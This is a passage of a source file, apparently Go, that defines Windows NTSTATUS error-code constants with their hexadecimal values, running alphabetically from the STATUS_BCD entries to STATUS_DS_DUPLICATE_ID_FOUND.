STATUS_BCD_NOT_ALL_ENTRIES_SYNCHRONIZED                                   NTStatus      = 0x80390003
STATUS_BCD_TOO_MANY_ELEMENTS                                              NTStatus      = 0xC0390002
STATUS_BEGINNING_OF_MEDIA                                                 NTStatus      = 0x8000001F
STATUS_BEYOND_VDL                                                         NTStatus      = 0xC0000432
STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT                                   NTStatus      = 0xC000016E
STATUS_BIZRULES_NOT_ENABLED                                               NTStatus      = 0x40000034
STATUS_BLOCKED_BY_PARENTAL_CONTROLS                                       NTStatus      = 0xC0000488
STATUS_BLOCK_TOO_MANY_REFERENCES                                          NTStatus      = 0xC000048C
STATUS_BREAKPOINT                                                         NTStatus      = 0x80000003
STATUS_BTH_ATT_ATTRIBUTE_NOT_FOUND                                        NTStatus      = 0xC042000A
STATUS_BTH_ATT_ATTRIBUTE_NOT_LONG                                         NTStatus      = 0xC042000B
STATUS_BTH_ATT_INSUFFICIENT_AUTHENTICATION                                NTStatus      = 0xC0420005
STATUS_BTH_ATT_INSUFFICIENT_AUTHORIZATION                                 NTStatus      = 0xC0420008
STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION                                    NTStatus      = 0xC042000F
STATUS_BTH_ATT_INSUFFICIENT_ENCRYPTION_KEY_SIZE                           NTStatus      = 0xC042000C
STATUS_BTH_ATT_INSUFFICIENT_RESOURCES                                     NTStatus      = 0xC0420011
STATUS_BTH_ATT_INVALID_ATTRIBUTE_VALUE_LENGTH                             NTStatus      = 0xC042000D
STATUS_BTH_ATT_INVALID_HANDLE                                             NTStatus      = 0xC0420001
STATUS_BTH_ATT_INVALID_OFFSET                                             NTStatus      = 0xC0420007
STATUS_BTH_ATT_INVALID_PDU                                                NTStatus      = 0xC0420004
STATUS_BTH_ATT_PREPARE_QUEUE_FULL                                         NTStatus      = 0xC0420009
STATUS_BTH_ATT_READ_NOT_PERMITTED                                         NTStatus      = 0xC0420002
STATUS_BTH_ATT_REQUEST_NOT_SUPPORTED                                      NTStatus      = 0xC0420006
STATUS_BTH_ATT_UNKNOWN_ERROR                                              NTStatus      = 0xC0421000
STATUS_BTH_ATT_UNLIKELY                                                   NTStatus      = 0xC042000E
STATUS_BTH_ATT_UNSUPPORTED_GROUP_TYPE                                     NTStatus      = 0xC0420010
STATUS_BTH_ATT_WRITE_NOT_PERMITTED                                        NTStatus      = 0xC0420003
STATUS_BUFFER_ALL_ZEROS                                                   NTStatus      = 0x00000117
STATUS_BUFFER_OVERFLOW                                                    NTStatus      = 0x80000005
STATUS_BUFFER_TOO_SMALL                                                   NTStatus      = 0xC0000023
STATUS_BUS_RESET                                                          NTStatus      = 0x8000001D
STATUS_CACHE_PAGE_LOCKED                                                  NTStatus      = 0x00000115
STATUS_CALLBACK_BYPASS                                                    NTStatus      = 0xC0000503
STATUS_CALLBACK_INVOKE_INLINE                                             NTStatus      = 0xC000048B
STATUS_CALLBACK_POP_STACK                                                 NTStatus      = 0xC0000423
STATUS_CALLBACK_RETURNED_LANG                                             NTStatus      = 0xC000071F
STATUS_CALLBACK_RETURNED_LDR_LOCK                                         NTStatus      = 0xC000071E
STATUS_CALLBACK_RETURNED_PRI_BACK                                         NTStatus      = 0xC0000720
STATUS_CALLBACK_RETURNED_THREAD_AFFINITY                                  NTStatus      = 0xC0000721
STATUS_CALLBACK_RETURNED_THREAD_PRIORITY                                  NTStatus      = 0xC000071B
STATUS_CALLBACK_RETURNED_TRANSACTION                                      NTStatus      = 0xC000071D
STATUS_CALLBACK_RETURNED_WHILE_IMPERSONATING                              NTStatus      = 0xC0000710
STATUS_CANCELLED                                                          NTStatus      = 0xC0000120
STATUS_CANNOT_ABORT_TRANSACTIONS                                          NTStatus      = 0xC019004D
STATUS_CANNOT_ACCEPT_TRANSACTED_WORK                                      NTStatus      = 0xC019004C
STATUS_CANNOT_BREAK_OPLOCK                                                NTStatus      = 0xC0000909
STATUS_CANNOT_DELETE                                                      NTStatus      = 0xC0000121
STATUS_CANNOT_EXECUTE_FILE_IN_TRANSACTION                                 NTStatus      = 0xC0190044
STATUS_CANNOT_GRANT_REQUESTED_OPLOCK                                      NTStatus      = 0x8000002E
STATUS_CANNOT_IMPERSONATE                                                 NTStatus      = 0xC000010D
STATUS_CANNOT_LOAD_REGISTRY_FILE                                          NTStatus      = 0xC0000218
STATUS_CANNOT_MAKE                                                        NTStatus      = 0xC00002EA
STATUS_CANNOT_SWITCH_RUNLEVEL                                             NTStatus      = 0xC000A141
STATUS_CANT_ACCESS_DOMAIN_INFO                                            NTStatus      = 0xC00000DA
STATUS_CANT_BREAK_TRANSACTIONAL_DEPENDENCY                                NTStatus      = 0xC0190037
STATUS_CANT_CLEAR_ENCRYPTION_FLAG                                         NTStatus      = 0xC00004B8
STATUS_CANT_CREATE_MORE_STREAM_MINIVERSIONS                               NTStatus      = 0xC0190026
STATUS_CANT_CROSS_RM_BOUNDARY                                             NTStatus      = 0xC0190038
STATUS_CANT_DISABLE_MANDATORY                                             NTStatus      = 0xC000005D
STATUS_CANT_ENABLE_DENY_ONLY                                              NTStatus      = 0xC00002B3
STATUS_CANT_OPEN_ANONYMOUS                                                NTStatus      = 0xC00000A6
STATUS_CANT_OPEN_MINIVERSION_WITH_MODIFY_INTENT                           NTStatus      = 0xC0190025
STATUS_CANT_RECOVER_WITH_HANDLE_OPEN                                      NTStatus      = 0x80190031
STATUS_CANT_TERMINATE_SELF                                                NTStatus      = 0xC00000DB
STATUS_CANT_WAIT                                                          NTStatus      = 0xC00000D8
STATUS_CARDBUS_NOT_SUPPORTED                                              NTStatus      = 0x40000027
STATUS_CASE_DIFFERING_NAMES_IN_DIR                                        NTStatus      = 0xC00004B3
STATUS_CERTIFICATE_MAPPING_NOT_UNIQUE                                     NTStatus      = 0xC0000714
STATUS_CHECKING_FILE_SYSTEM                                               NTStatus      = 0x40000014
STATUS_CHECKOUT_REQUIRED                                                  NTStatus      = 0xC0000902
STATUS_CHILD_MUST_BE_VOLATILE                                             NTStatus      = 0xC0000181
STATUS_CHILD_PROCESS_BLOCKED                                              NTStatus      = 0xC000049D
STATUS_CLEANER_CARTRIDGE_INSTALLED                                        NTStatus      = 0x80000027
STATUS_CLIENT_SERVER_PARAMETERS_INVALID                                   NTStatus      = 0xC0000223
STATUS_CLIP_DEVICE_LICENSE_MISSING                                        NTStatus      = 0xC0EA0003
STATUS_CLIP_KEYHOLDER_LICENSE_MISSING_OR_INVALID                          NTStatus      = 0xC0EA0005
STATUS_CLIP_LICENSE_DEVICE_ID_MISMATCH                                    NTStatus      = 0xC0EA000A
STATUS_CLIP_LICENSE_EXPIRED                                               NTStatus      = 0xC0EA0006
STATUS_CLIP_LICENSE_HARDWARE_ID_OUT_OF_TOLERANCE                          NTStatus      = 0xC0EA0009
STATUS_CLIP_LICENSE_INVALID_SIGNATURE                                     NTStatus      = 0xC0EA0004
STATUS_CLIP_LICENSE_NOT_FOUND                                             NTStatus      = 0xC0EA0002
STATUS_CLIP_LICENSE_NOT_SIGNED                                            NTStatus      = 0xC0EA0008
STATUS_CLIP_LICENSE_SIGNED_BY_UNKNOWN_SOURCE                              NTStatus      = 0xC0EA0007
STATUS_CLOUD_FILE_ACCESS_DENIED                                           NTStatus      = 0xC000CF18
STATUS_CLOUD_FILE_ALREADY_CONNECTED                                       NTStatus      = 0xC000CF09
STATUS_CLOUD_FILE_AUTHENTICATION_FAILED                                   NTStatus      = 0xC000CF0F
STATUS_CLOUD_FILE_CONNECTED_PROVIDER_ONLY                                 NTStatus      = 0xC000CF0D
STATUS_CLOUD_FILE_INCOMPATIBLE_HARDLINKS                                  NTStatus      = 0xC000CF19
STATUS_CLOUD_FILE_INSUFFICIENT_RESOURCES                                  NTStatus      = 0xC000CF10
STATUS_CLOUD_FILE_INVALID_REQUEST                                         NTStatus      = 0xC000CF0B
STATUS_CLOUD_FILE_IN_USE                                                  NTStatus      = 0xC000CF14
STATUS_CLOUD_FILE_METADATA_CORRUPT                                        NTStatus      = 0xC000CF02
STATUS_CLOUD_FILE_METADATA_TOO_LARGE                                      NTStatus      = 0xC000CF03
STATUS_CLOUD_FILE_NETWORK_UNAVAILABLE                                     NTStatus      = 0xC000CF11
STATUS_CLOUD_FILE_NOT_IN_SYNC                                             NTStatus      = 0xC000CF08
STATUS_CLOUD_FILE_NOT_SUPPORTED                                           NTStatus      = 0xC000CF0A
STATUS_CLOUD_FILE_NOT_UNDER_SYNC_ROOT                                     NTStatus      = 0xC000CF13
STATUS_CLOUD_FILE_PINNED                                                  NTStatus      = 0xC000CF15
STATUS_CLOUD_FILE_PROPERTY_BLOB_CHECKSUM_MISMATCH                         NTStatus      = 0x8000CF00
STATUS_CLOUD_FILE_PROPERTY_BLOB_TOO_LARGE                                 NTStatus      = 0x8000CF04
STATUS_CLOUD_FILE_PROPERTY_CORRUPT                                        NTStatus      = 0xC000CF17
STATUS_CLOUD_FILE_PROPERTY_LOCK_CONFLICT                                  NTStatus      = 0xC000CF1A
STATUS_CLOUD_FILE_PROPERTY_VERSION_NOT_SUPPORTED                          NTStatus      = 0xC000CF06
STATUS_CLOUD_FILE_PROVIDER_NOT_RUNNING                                    NTStatus      = 0xC000CF01
STATUS_CLOUD_FILE_PROVIDER_TERMINATED                                     NTStatus      = 0xC000CF1D
STATUS_CLOUD_FILE_READ_ONLY_VOLUME                                        NTStatus      = 0xC000CF0C
STATUS_CLOUD_FILE_REQUEST_ABORTED                                         NTStatus      = 0xC000CF16
STATUS_CLOUD_FILE_REQUEST_CANCELED                                        NTStatus      = 0xC000CF1B
STATUS_CLOUD_FILE_REQUEST_TIMEOUT                                         NTStatus      = 0xC000CF1F
STATUS_CLOUD_FILE_SYNC_ROOT_METADATA_CORRUPT                              NTStatus      = 0xC000CF00
STATUS_CLOUD_FILE_TOO_MANY_PROPERTY_BLOBS                                 NTStatus      = 0x8000CF05
STATUS_CLOUD_FILE_UNSUCCESSFUL                                            NTStatus      = 0xC000CF12
STATUS_CLOUD_FILE_VALIDATION_FAILED                                       NTStatus      = 0xC000CF0E
STATUS_CLUSTER_CAM_TICKET_REPLAY_DETECTED                                 NTStatus      = 0xC0130031
STATUS_CLUSTER_CSV_AUTO_PAUSE_ERROR                                       NTStatus      = 0xC0130021
STATUS_CLUSTER_CSV_INVALID_HANDLE                                         NTStatus      = 0xC0130029
STATUS_CLUSTER_CSV_NOT_REDIRECTED                                         NTStatus      = 0xC0130023
STATUS_CLUSTER_CSV_NO_SNAPSHOTS                                           NTStatus      = 0xC0130027
STATUS_CLUSTER_CSV_READ_OPLOCK_BREAK_IN_PROGRESS                          NTStatus      = 0xC0130020
STATUS_CLUSTER_CSV_REDIRECTED                                             NTStatus      = 0xC0130022
STATUS_CLUSTER_CSV_SNAPSHOT_CREATION_IN_PROGRESS                          NTStatus      = 0xC0130025
STATUS_CLUSTER_CSV_SUPPORTED_ONLY_ON_COORDINATOR                          NTStatus      = 0xC0130030
STATUS_CLUSTER_CSV_VOLUME_DRAINING                                        NTStatus      = 0xC0130024
STATUS_CLUSTER_CSV_VOLUME_DRAINING_SUCCEEDED_DOWNLEVEL                    NTStatus      = 0xC0130026
STATUS_CLUSTER_CSV_VOLUME_NOT_LOCAL                                       NTStatus      = 0xC0130019
STATUS_CLUSTER_INVALID_NETWORK                                            NTStatus      = 0xC0130010
STATUS_CLUSTER_INVALID_NETWORK_PROVIDER                                   NTStatus      = 0xC013000B
STATUS_CLUSTER_INVALID_NODE                                               NTStatus      = 0xC0130001
STATUS_CLUSTER_INVALID_REQUEST                                            NTStatus      = 0xC013000A
STATUS_CLUSTER_JOIN_IN_PROGRESS                                           NTStatus      = 0xC0130003
STATUS_CLUSTER_JOIN_NOT_IN_PROGRESS                                       NTStatus      = 0xC013000F
STATUS_CLUSTER_LOCAL_NODE_NOT_FOUND                                       NTStatus      = 0xC0130005
STATUS_CLUSTER_NETINTERFACE_EXISTS                                        NTStatus      = 0xC0130008
STATUS_CLUSTER_NETINTERFACE_NOT_FOUND                                     NTStatus      = 0xC0130009
STATUS_CLUSTER_NETWORK_ALREADY_OFFLINE                                    NTStatus      = 0x80130004
STATUS_CLUSTER_NETWORK_ALREADY_ONLINE                                     NTStatus      = 0x80130003
STATUS_CLUSTER_NETWORK_EXISTS                                             NTStatus      = 0xC0130006
STATUS_CLUSTER_NETWORK_NOT_FOUND                                          NTStatus      = 0xC0130007
STATUS_CLUSTER_NETWORK_NOT_INTERNAL                                       NTStatus      = 0xC0130016
STATUS_CLUSTER_NODE_ALREADY_DOWN                                          NTStatus      = 0x80130002
STATUS_CLUSTER_NODE_ALREADY_MEMBER                                        NTStatus      = 0x80130005
STATUS_CLUSTER_NODE_ALREADY_UP                                            NTStatus      = 0x80130001
STATUS_CLUSTER_NODE_DOWN                                                  NTStatus      = 0xC013000C
STATUS_CLUSTER_NODE_EXISTS                                                NTStatus      = 0xC0130002
STATUS_CLUSTER_NODE_NOT_FOUND                                             NTStatus      = 0xC0130004
STATUS_CLUSTER_NODE_NOT_MEMBER                                            NTStatus      = 0xC013000E
STATUS_CLUSTER_NODE_NOT_PAUSED                                            NTStatus      = 0xC0130014
STATUS_CLUSTER_NODE_PAUSED                                                NTStatus      = 0xC0130013
STATUS_CLUSTER_NODE_UNREACHABLE                                           NTStatus      = 0xC013000D
STATUS_CLUSTER_NODE_UP                                                    NTStatus      = 0xC0130012
STATUS_CLUSTER_NON_CSV_PATH                                               NTStatus      = 0xC0130018
STATUS_CLUSTER_NO_NET_ADAPTERS                                            NTStatus      = 0xC0130011
STATUS_CLUSTER_NO_SECURITY_CONTEXT                                        NTStatus      = 0xC0130015
STATUS_CLUSTER_POISONED                                                   NTStatus      = 0xC0130017
STATUS_COMMITMENT_LIMIT                                                   NTStatus      = 0xC000012D
STATUS_COMMITMENT_MINIMUM                                                 NTStatus      = 0xC00002C8
STATUS_COMPRESSED_FILE_NOT_SUPPORTED                                      NTStatus      = 0xC000047B
STATUS_COMPRESSION_DISABLED                                               NTStatus      = 0xC0000426
STATUS_COMPRESSION_NOT_ALLOWED_IN_TRANSACTION                             NTStatus      = 0xC0190056
STATUS_COMPRESSION_NOT_BENEFICIAL                                         NTStatus      = 0xC000046F
STATUS_CONFLICTING_ADDRESSES                                              NTStatus      = 0xC0000018
STATUS_CONNECTION_ABORTED                                                 NTStatus      = 0xC0000241
STATUS_CONNECTION_ACTIVE                                                  NTStatus      = 0xC000023B
STATUS_CONNECTION_COUNT_LIMIT                                             NTStatus      = 0xC0000246
STATUS_CONNECTION_DISCONNECTED                                            NTStatus      = 0xC000020C
STATUS_CONNECTION_INVALID                                                 NTStatus      = 0xC000023A
STATUS_CONNECTION_IN_USE                                                  NTStatus      = 0xC0000108
STATUS_CONNECTION_REFUSED                                                 NTStatus      = 0xC0000236
STATUS_CONNECTION_RESET                                                   NTStatus      = 0xC000020D
STATUS_CONTAINER_ASSIGNED                                                 NTStatus      = 0xC0000508
STATUS_CONTENT_BLOCKED                                                    NTStatus      = 0xC0000804
STATUS_CONTEXT_MISMATCH                                                   NTStatus      = 0xC0000719
STATUS_CONTEXT_STOWED_EXCEPTION                                           NTStatus      = 0xC000027C
STATUS_CONTROL_C_EXIT                                                     NTStatus      = 0xC000013A
STATUS_CONVERT_TO_LARGE                                                   NTStatus      = 0xC000022C
STATUS_COPY_PROTECTION_FAILURE                                            NTStatus      = 0xC0000305
STATUS_CORRUPT_LOG_CLEARED                                                NTStatus      = 0xC000080D
STATUS_CORRUPT_LOG_CORRUPTED                                              NTStatus      = 0xC000080A
STATUS_CORRUPT_LOG_DELETED_FULL                                           NTStatus      = 0xC000080C
STATUS_CORRUPT_LOG_OVERFULL                                               NTStatus      = 0xC0000809
STATUS_CORRUPT_LOG_UNAVAILABLE                                            NTStatus      = 0xC000080B
STATUS_CORRUPT_LOG_UPLEVEL_RECORDS                                        NTStatus      = 0xC0000811
STATUS_CORRUPT_SYSTEM_FILE                                                NTStatus      = 0xC00002C4
STATUS_COULD_NOT_INTERPRET                                                NTStatus      = 0xC00000B9
STATUS_COULD_NOT_RESIZE_LOG                                               NTStatus      = 0x80190009
STATUS_CPU_SET_INVALID                                                    NTStatus      = 0xC00001AF
STATUS_CRASH_DUMP                                                         NTStatus      = 0x00000116
STATUS_CRC_ERROR                                                          NTStatus      = 0xC000003F
STATUS_CRED_REQUIRES_CONFIRMATION                                         NTStatus      = 0xC0000440
STATUS_CRM_PROTOCOL_ALREADY_EXISTS                                        NTStatus      = 0xC019000F
STATUS_CRM_PROTOCOL_NOT_FOUND                                             NTStatus      = 0xC0190011
STATUS_CROSSREALM_DELEGATION_FAILURE                                      NTStatus      = 0xC000040B
STATUS_CROSS_PARTITION_VIOLATION                                          NTStatus      = 0xC000060B
STATUS_CRYPTO_SYSTEM_INVALID                                              NTStatus      = 0xC00002F3
STATUS_CSS_AUTHENTICATION_FAILURE                                         NTStatus      = 0xC0000306
STATUS_CSS_KEY_NOT_ESTABLISHED                                            NTStatus      = 0xC0000308
STATUS_CSS_KEY_NOT_PRESENT                                                NTStatus      = 0xC0000307
STATUS_CSS_REGION_MISMATCH                                                NTStatus      = 0xC000030A
STATUS_CSS_RESETS_EXHAUSTED                                               NTStatus      = 0xC000030B
STATUS_CSS_SCRAMBLED_SECTOR                                               NTStatus      = 0xC0000309
STATUS_CSV_IO_PAUSE_TIMEOUT                                               NTStatus      = 0xC0130028
STATUS_CS_ENCRYPTION_EXISTING_ENCRYPTED_FILE                              NTStatus      = 0xC0000443
STATUS_CS_ENCRYPTION_FILE_NOT_CSE                                         NTStatus      = 0xC0000445
STATUS_CS_ENCRYPTION_INVALID_SERVER_RESPONSE                              NTStatus      = 0xC0000441
STATUS_CS_ENCRYPTION_NEW_ENCRYPTED_FILE                                   NTStatus      = 0xC0000444
STATUS_CS_ENCRYPTION_UNSUPPORTED_SERVER                                   NTStatus      = 0xC0000442
STATUS_CTLOG_INCONSISTENT_TRACKING_FILE                                   NTStatus      = 0xC03A0024
STATUS_CTLOG_INVALID_TRACKING_STATE                                       NTStatus      = 0xC03A0023
STATUS_CTLOG_LOGFILE_SIZE_EXCEEDED_MAXSIZE                                NTStatus      = 0xC03A0021
STATUS_CTLOG_TRACKING_NOT_INITIALIZED                                     NTStatus      = 0xC03A0020
STATUS_CTLOG_VHD_CHANGED_OFFLINE                                          NTStatus      = 0xC03A0022
STATUS_CTL_FILE_NOT_SUPPORTED                                             NTStatus      = 0xC0000057
STATUS_CTX_BAD_VIDEO_MODE                                                 NTStatus      = 0xC00A0018
STATUS_CTX_CDM_CONNECT                                                    NTStatus      = 0x400A0004
STATUS_CTX_CDM_DISCONNECT                                                 NTStatus      = 0x400A0005
STATUS_CTX_CLIENT_LICENSE_IN_USE                                          NTStatus      = 0xC00A0034
STATUS_CTX_CLIENT_LICENSE_NOT_SET                                         NTStatus      = 0xC00A0033
STATUS_CTX_CLIENT_QUERY_TIMEOUT                                           NTStatus      = 0xC00A0026
STATUS_CTX_CLOSE_PENDING                                                  NTStatus      = 0xC00A0006
STATUS_CTX_CONSOLE_CONNECT                                                NTStatus      = 0xC00A0028
STATUS_CTX_CONSOLE_DISCONNECT                                             NTStatus      = 0xC00A0027
STATUS_CTX_GRAPHICS_INVALID                                               NTStatus      = 0xC00A0022
STATUS_CTX_INVALID_MODEMNAME                                              NTStatus      = 0xC00A0009
STATUS_CTX_INVALID_PD                                                     NTStatus      = 0xC00A0002
STATUS_CTX_INVALID_WD                                                     NTStatus      = 0xC00A002E
STATUS_CTX_LICENSE_CLIENT_INVALID                                         NTStatus      = 0xC00A0012
STATUS_CTX_LICENSE_EXPIRED                                                NTStatus      = 0xC00A0014
STATUS_CTX_LICENSE_NOT_AVAILABLE                                          NTStatus      = 0xC00A0013
STATUS_CTX_LOGON_DISABLED                                                 NTStatus      = 0xC00A0037
STATUS_CTX_MODEM_INF_NOT_FOUND                                            NTStatus      = 0xC00A0008
STATUS_CTX_MODEM_RESPONSE_BUSY                                            NTStatus      = 0xC00A000E
STATUS_CTX_MODEM_RESPONSE_NO_CARRIER                                      NTStatus      = 0xC00A000C
STATUS_CTX_MODEM_RESPONSE_NO_DIALTONE                                     NTStatus      = 0xC00A000D
STATUS_CTX_MODEM_RESPONSE_TIMEOUT                                         NTStatus      = 0xC00A000B
STATUS_CTX_MODEM_RESPONSE_VOICE                                           NTStatus      = 0xC00A000F
STATUS_CTX_NOT_CONSOLE                                                    NTStatus      = 0xC00A0024
STATUS_CTX_NO_OUTBUF                                                      NTStatus      = 0xC00A0007
STATUS_CTX_PD_NOT_FOUND                                                   NTStatus      = 0xC00A0003
STATUS_CTX_RESPONSE_ERROR                                                 NTStatus      = 0xC00A000A
STATUS_CTX_SECURITY_LAYER_ERROR                                           NTStatus      = 0xC00A0038
STATUS_CTX_SHADOW_DENIED                                                  NTStatus      = 0xC00A002A
STATUS_CTX_SHADOW_DISABLED                                                NTStatus      = 0xC00A0031
STATUS_CTX_SHADOW_ENDED_BY_MODE_CHANGE                                    NTStatus      = 0xC00A0035
STATUS_CTX_SHADOW_INVALID                                                 NTStatus      = 0xC00A0030
STATUS_CTX_SHADOW_NOT_RUNNING                                             NTStatus      = 0xC00A0036
STATUS_CTX_TD_ERROR                                                       NTStatus      = 0xC00A0010
STATUS_CTX_WD_NOT_FOUND                                                   NTStatus      = 0xC00A002F
STATUS_CTX_WINSTATION_ACCESS_DENIED                                       NTStatus      = 0xC00A002B
STATUS_CTX_WINSTATION_BUSY                                                NTStatus      = 0xC00A0017
STATUS_CTX_WINSTATION_NAME_COLLISION                                      NTStatus      = 0xC00A0016
STATUS_CTX_WINSTATION_NAME_INVALID                                        NTStatus      = 0xC00A0001
STATUS_CTX_WINSTATION_NOT_FOUND                                           NTStatus      = 0xC00A0015
STATUS_CURRENT_DOMAIN_NOT_ALLOWED                                         NTStatus      = 0xC00002E9
STATUS_CURRENT_TRANSACTION_NOT_VALID                                      NTStatus      = 0xC0190018
STATUS_DATATYPE_MISALIGNMENT                                              NTStatus      = 0x80000002
STATUS_DATATYPE_MISALIGNMENT_ERROR                                        NTStatus      = 0xC00002C5
STATUS_DATA_CHECKSUM_ERROR                                                NTStatus      = 0xC0000470
STATUS_DATA_ERROR                                                         NTStatus      = 0xC000003E
STATUS_DATA_LATE_ERROR                                                    NTStatus      = 0xC000003D
STATUS_DATA_LOST_REPAIR                                                   NTStatus      = 0x80000803
STATUS_DATA_NOT_ACCEPTED                                                  NTStatus      = 0xC000021B
STATUS_DATA_OVERRUN                                                       NTStatus      = 0xC000003C
STATUS_DATA_OVERWRITTEN                                                   NTStatus      = 0x00000130
STATUS_DAX_MAPPING_EXISTS                                                 NTStatus      = 0xC000049C
STATUS_DEBUGGER_INACTIVE                                                  NTStatus      = 0xC0000354
STATUS_DEBUG_ATTACH_FAILED                                                NTStatus      = 0xC0000219
STATUS_DECRYPTION_FAILED                                                  NTStatus      = 0xC000028B
STATUS_DELAY_LOAD_FAILED                                                  NTStatus      = 0xC0000412
STATUS_DELETE_PENDING                                                     NTStatus      = 0xC0000056
STATUS_DESTINATION_ELEMENT_FULL                                           NTStatus      = 0xC0000284
STATUS_DEVICE_ALREADY_ATTACHED                                            NTStatus      = 0xC0000038
STATUS_DEVICE_BUSY                                                        NTStatus      = 0x80000011
STATUS_DEVICE_CONFIGURATION_ERROR                                         NTStatus      = 0xC0000182
STATUS_DEVICE_DATA_ERROR                                                  NTStatus      = 0xC000009C
STATUS_DEVICE_DOES_NOT_EXIST                                              NTStatus      = 0xC00000C0
STATUS_DEVICE_DOOR_OPEN                                                   NTStatus      = 0x80000289
STATUS_DEVICE_ENUMERATION_ERROR                                           NTStatus      = 0xC0000366
STATUS_DEVICE_FEATURE_NOT_SUPPORTED                                       NTStatus      = 0xC0000463
STATUS_DEVICE_HARDWARE_ERROR                                              NTStatus      = 0xC0000483
STATUS_DEVICE_HINT_NAME_BUFFER_TOO_SMALL                                  NTStatus      = 0xC0000496
STATUS_DEVICE_HUNG                                                        NTStatus      = 0xC0000507
STATUS_DEVICE_INSUFFICIENT_RESOURCES                                      NTStatus      = 0xC0000468
STATUS_DEVICE_IN_MAINTENANCE                                              NTStatus      = 0xC0000499
STATUS_DEVICE_NOT_CONNECTED                                               NTStatus      = 0xC000009D
STATUS_DEVICE_NOT_PARTITIONED                                             NTStatus      = 0xC0000174
STATUS_DEVICE_NOT_READY                                                   NTStatus      = 0xC00000A3
STATUS_DEVICE_OFF_LINE                                                    NTStatus      = 0x80000010
STATUS_DEVICE_PAPER_EMPTY                                                 NTStatus      = 0x8000000E
STATUS_DEVICE_POWERED_OFF                                                 NTStatus      = 0x8000000F
STATUS_DEVICE_POWER_CYCLE_REQUIRED                                        NTStatus      = 0x80000031
STATUS_DEVICE_POWER_FAILURE                                               NTStatus      = 0xC000009E
STATUS_DEVICE_PROTOCOL_ERROR                                              NTStatus      = 0xC0000186
STATUS_DEVICE_REMOVED                                                     NTStatus      = 0xC00002B6
STATUS_DEVICE_REQUIRES_CLEANING                                           NTStatus      = 0x80000288
STATUS_DEVICE_SUPPORT_IN_PROGRESS                                         NTStatus      = 0x80000030
STATUS_DEVICE_UNREACHABLE                                                 NTStatus      = 0xC0000464
STATUS_DEVICE_UNRESPONSIVE                                                NTStatus      = 0xC000050A
STATUS_DFS_EXIT_PATH_FOUND                                                NTStatus      = 0xC000009B
STATUS_DFS_UNAVAILABLE                                                    NTStatus      = 0xC000026D
STATUS_DIRECTORY_IS_A_REPARSE_POINT                                       NTStatus      = 0xC0000281
STATUS_DIRECTORY_NOT_EMPTY                                                NTStatus      = 0xC0000101
STATUS_DIRECTORY_NOT_RM                                                   NTStatus      = 0xC0190008
STATUS_DIRECTORY_NOT_SUPPORTED                                            NTStatus      = 0xC000047C
STATUS_DIRECTORY_SERVICE_REQUIRED                                         NTStatus      = 0xC00002B1
STATUS_DISK_CORRUPT_ERROR                                                 NTStatus      = 0xC0000032
STATUS_DISK_FULL                                                          NTStatus      = 0xC000007F
STATUS_DISK_OPERATION_FAILED                                              NTStatus      = 0xC000016A
STATUS_DISK_QUOTA_EXCEEDED                                                NTStatus      = 0xC0000802
STATUS_DISK_RECALIBRATE_FAILED                                            NTStatus      = 0xC0000169
STATUS_DISK_REPAIR_DISABLED                                               NTStatus      = 0xC0000800
STATUS_DISK_REPAIR_REDIRECTED                                             NTStatus      = 0x40000807
STATUS_DISK_REPAIR_UNSUCCESSFUL                                           NTStatus      = 0xC0000808
STATUS_DISK_RESET_FAILED                                                  NTStatus      = 0xC000016B
STATUS_DISK_RESOURCES_EXHAUSTED                                           NTStatus      = 0xC0000461
STATUS_DLL_INIT_FAILED                                                    NTStatus      = 0xC0000142
STATUS_DLL_INIT_FAILED_LOGOFF                                             NTStatus      = 0xC000026B
STATUS_DLL_MIGHT_BE_INCOMPATIBLE                                          NTStatus      = 0x8000002C
STATUS_DLL_MIGHT_BE_INSECURE                                              NTStatus      = 0x8000002B
STATUS_DLL_NOT_FOUND                                                      NTStatus      = 0xC0000135
STATUS_DOMAIN_CONTROLLER_NOT_FOUND                                        NTStatus      = 0xC0000233
STATUS_DOMAIN_CTRLR_CONFIG_ERROR                                          NTStatus      = 0xC000015E
STATUS_DOMAIN_EXISTS                                                      NTStatus      = 0xC00000E0
STATUS_DOMAIN_LIMIT_EXCEEDED                                              NTStatus      = 0xC00000E1
STATUS_DOMAIN_TRUST_INCONSISTENT                                          NTStatus      = 0xC000019B
STATUS_DOWNGRADE_DETECTED                                                 NTStatus      = 0xC0000388
STATUS_DRIVERS_LEAKING_LOCKED_PAGES                                       NTStatus      = 0x4000002D
STATUS_DRIVER_BLOCKED                                                     NTStatus      = 0xC000036C
STATUS_DRIVER_BLOCKED_CRITICAL                                            NTStatus      = 0xC000036B
STATUS_DRIVER_CANCEL_TIMEOUT                                              NTStatus      = 0xC000021E
STATUS_DRIVER_DATABASE_ERROR                                              NTStatus      = 0xC000036D
STATUS_DRIVER_ENTRYPOINT_NOT_FOUND                                        NTStatus      = 0xC0000263
STATUS_DRIVER_FAILED_PRIOR_UNLOAD                                         NTStatus      = 0xC000038E
STATUS_DRIVER_FAILED_SLEEP                                                NTStatus      = 0xC00002C2
STATUS_DRIVER_INTERNAL_ERROR                                              NTStatus      = 0xC0000183
STATUS_DRIVER_ORDINAL_NOT_FOUND                                           NTStatus      = 0xC0000262
STATUS_DRIVER_PROCESS_TERMINATED                                          NTStatus      = 0xC0000450
STATUS_DRIVER_UNABLE_TO_LOAD                                              NTStatus      = 0xC000026C
STATUS_DS_ADMIN_LIMIT_EXCEEDED                                            NTStatus      = 0xC00002C1
STATUS_DS_AG_CANT_HAVE_UNIVERSAL_MEMBER                                   NTStatus      = 0xC0000358
STATUS_DS_ATTRIBUTE_OR_VALUE_EXISTS                                       NTStatus      = 0xC00002A4
STATUS_DS_ATTRIBUTE_TYPE_UNDEFINED                                        NTStatus      = 0xC00002A3
STATUS_DS_BUSY                                                            NTStatus      = 0xC00002A5
STATUS_DS_CANT_MOD_OBJ_CLASS                                              NTStatus      = 0xC00002AE
STATUS_DS_CANT_MOD_PRIMARYGROUPID                                         NTStatus      = 0xC00002D0
STATUS_DS_CANT_ON_NON_LEAF                                                NTStatus      = 0xC00002AC
STATUS_DS_CANT_ON_RDN                                                     NTStatus      = 0xC00002AD
STATUS_DS_CANT_START                                                      NTStatus      = 0xC00002E1
STATUS_DS_CROSS_DOM_MOVE_FAILED                                           NTStatus      = 0xC00002AF
STATUS_DS_DOMAIN_NAME_EXISTS_IN_FOREST                                    NTStatus      = 0xC000041A
STATUS_DS_DOMAIN_RENAME_IN_PROGRESS                                       NTStatus      = 0xC0000801
STATUS_DS_DUPLICATE_ID_FOUND                                              NTStatus      = 0xC0000405
